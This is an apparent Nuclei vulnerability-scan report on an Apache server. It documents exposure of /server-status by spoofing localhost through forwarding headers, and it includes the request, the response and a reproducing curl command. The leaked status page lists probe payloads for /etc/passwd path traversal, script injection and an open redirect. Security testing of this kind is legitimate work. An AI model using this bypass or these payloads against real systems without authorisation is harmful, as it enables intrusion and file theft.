### Server Status Disclosure (server-status-localhost) found on http://192.168.200.214
---
**Details**: **server-status-localhost**  matched at http://192.168.200.214

**Protocol**: HTTP

**Full URL**: http://192.168.200.214/server-status

**Timestamp**: Thu Oct 27 18:21:04 +0100 BST 2022

**Template Information**

| Key | Value |
|---|---|
| Name | Server Status Disclosure |
| Authors | pdteam, geeknik |
| Tags | apache, debug |
| Severity | low |

**Request**
```http
GET /server-status HTTP/1.1
Host: 192.168.200.214
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Forwarded: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-For-IP: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Host: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-True-IP: 127.0.0.1
Accept-Encoding: gzip


```

**Response**
```http
HTTP/1.1 200 OK
Connection: close
Content-Type: text/html; charset=ISO-8859-1
Date: Thu, 27 Oct 2022 17:21:04 GMT
Server: Apache/2.4.53 (Debian)
Vary: Accept-Encoding
X-Backend-Server: primary

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html><head>
<title>Apache Status</title>
</head><body>
<h1>Apache Server Status for 192.168.200.214 (via 127.0.0.1)</h1>

<dl><dt>Server Version: Apache/2.4.53 (Debian)</dt>
<dt>Server MPM: prefork</dt>
<dt>Server Built: 2022-03-14T16:28:35
</dt></dl><hr /><dl>
<dt>Current Time: Thursday, 27-Oct-2022 13:21:04 EDT</dt>
<dt>Restart Time: Wednesday, 28-Sep-2022 07:08:43 EDT</dt>
<dt>Parent Server Config. Generation: 2</dt>
<dt>Parent Server MPM Generation: 1</dt>
<dt>Server uptime:  29 days 6 hours 12 minutes 20 seconds</dt>
<dt>Server load: 0.04 0.08 0.06</dt>
<dt>Total accesses: 6161 - Total Traffic: 13.0 MB - Total Duration: 119641</dt>
<dt>CPU Usage: u2.14 s1.18 cu45.89 cs6.73 - .00221% CPU load</dt>
<dt>.00244 requests/sec - 5 B/second - 2212 B/request - 19.4191 ms/request</dt>
<dt>1 requests currently being processed, 6 idle workers</dt>
</dl><pre>______W.........................................................
................................................................
......................</pre>
<p>Scoreboard Key:<br />
"<b><code>_</code></b>" Waiting for Connection, 
"<b><code>S</code></b>" Starting up, 
"<b><code>R</code></b>" Reading Request,<br />
"<b><code>W</code></b>" Sending Reply, 
"<b><code>K</code></b>" Keepalive (read), 
"<b><code>D</code></b>" DNS Lookup,<br />
"<b><code>C</code></b>" Closing connection, 
"<b><code>L</code></b>" Logging, 
"<b><code>G</code></b>" Gracefully finishing,<br /> 
"<b><code>I</code></b>" Idle cleanup of worker, 
"<b><code>.</code></b>" Open slot with no current process<br />
</p>


<table border="0"><tr><th>Srv</th><th>PID</th><th>Acc</th><th>M</th><th>CPU
</th><th>SS</th><th>Req</th><th>Dur</th><th>Conn</th><th>Child</th><th>Slot</th><th>Client</th><th>Protocol</th><th>VHost</th><th>Request</th></tr>

<tr><td><b>0-1</b></td><td>2263</td><td>0/993/1005</td><td>_
</td><td>8.14</td><td>0</td><td>0</td><td>19894</td><td>0.0</td><td>1.97</td><td>2.14
</td><td>127.0.0.1</td><td>http/1.1</td><td nowrap>127.0.0.1:8080</td><td nowrap>GET /images/favicon.ico HTTP/1.1</td></tr>

<tr><td><b>1-1</b></td><td>2264</td><td>0/1036/1047</td><td>_
</td><td>7.39</td><td>0</td><td>0</td><td>18346</td><td>0.0</td><td>1.90</td><td>2.08
</td><td>127.0.0.1</td><td>http/1.1</td><td nowrap>127.0.0.1:8080</td><td nowrap>GET /Partners/application/configs/application.ini HTTP/1.1</td></tr>

<tr><td><b>2-1</b></td><td>2265</td><td>0/988/1000</td><td>_
</td><td>8.47</td><td>0</td><td>0</td><td>21007</td><td>0.0</td><td>2.03</td><td>2.23
</td><td>127.0.0.1</td><td>http/1.1</td><td nowrap>127.0.0.1:8080</td><td nowrap>GET /wp-content/plugins/embed-swagger/swagger-iframe.php?url=xs</td></tr>

<tr><td><b>3-1</b></td><td>2266</td><td>0/997/1009</td><td>_
</td><td>7.79</td><td>0</td><td>0</td><td>19333</td><td>0.0</td><td>1.92</td><td>2.11
</td><td>127.0.0.1</td><td>http/1.1</td><td nowrap>127.0.0.1:8080</td><td nowrap>GET /src/redirect.php?plugins[]=../../../../etc/passwd%00 HTTP/</td></tr>

<tr><td><b>4-1</b></td><td>2267</td><td>0/998/1009</td><td>_
</td><td>7.83</td><td>0</td><td>0</td><td>19121</td><td>0.0</td><td>1.97</td><td>2.15
</td><td>127.0.0.1</td><td>http/1.1</td><td nowrap>127.0.0.1:8080</td><td nowrap>GET /wp-content/themes/Attitude/go.php?https://interact.sh/ HTT</td></tr>

<tr><td><b>5-1</b></td><td>2520</td><td>0/995/1005</td><td>_
</td><td>7.70</td><td>0</td><td>0</td><td>18936</td><td>0.0</td><td>1.89</td><td>2.05
</td><td>127.0.0.1</td><td>http/1.1</td><td nowrap>127.0.0.1:8080</td><td nowrap>GET /login.html?returnTo=%3C%2Fscript%3E%3Cscript%3Ealert%28doc</td></tr>

<tr><td><b>6-1</b></td><td>7375</td><td>0/86/86</td><td><b>W</b>
</td><td>1.38</td><td>0</td><td>0</td><td>3000</td><td>0.0</td><td>0.24</td><td>0.24
</td><td>127.0.0.1</td><td>http/1.1</td><td nowrap>127.0.0.1:8080</td><td nowrap>GET /server-status HTTP/1.1</td></tr>

</table>
 <hr /> <table>
 <tr><th>Srv</th><td>Child Server number - generation</td></tr>
 <tr><th>PID</th><td>OS process ID</td></tr>
 <tr><th>Acc</th><td>Number of accesses this connection / this child / this slot</td></tr>
 <tr><th>M</th><td>Mode of operation</td></tr>
<tr><th>CPU</th><td>CPU usage, number of seconds</td></tr>
<tr><th>SS</th><td>Seconds since beginning of most recent request</td></tr>
 <tr><th>Req</th><td>Milliseconds required to process most recent request</td></tr>
 <tr><th>Dur</th><td>Sum of milliseconds required to process all requests</td></tr>
 <tr><th>Conn</th><td>Kilobytes transferred this connection</td></tr>
 <tr><th>Child</th><td>Megabytes transferred this child</td></tr>
 <tr><th>Slot</th><td>Total megabytes transferred this slot</td></tr>
 </table>
<hr />
<address>Apache/2.4.53 (Debian) Server at 192.168.200.214 Port 80</address>
</body></html>

```


**CURL Command**
```
curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Forwarded: 127.0.0.1' -H 'User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36' -H 'X-Client-IP: 127.0.0.1' -H 'X-Forwarded-By: 127.0.0.1' -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Forwarded-For-IP: 127.0.0.1' -H 'X-Forwarded-Host: 127.0.0.1' -H 'X-Host: 127.0.0.1' -H 'X-Originating-IP: 127.0.0.1' -H 'X-Remote-Addr: 127.0.0.1' -H 'X-Remote-IP: 127.0.0.1' -H 'X-True-IP: 127.0.0.1' 'http://192.168.200.214/server-status'
```
---
Generated by [Nuclei 2.7.8](https://github.com/projectdiscovery/nuclei)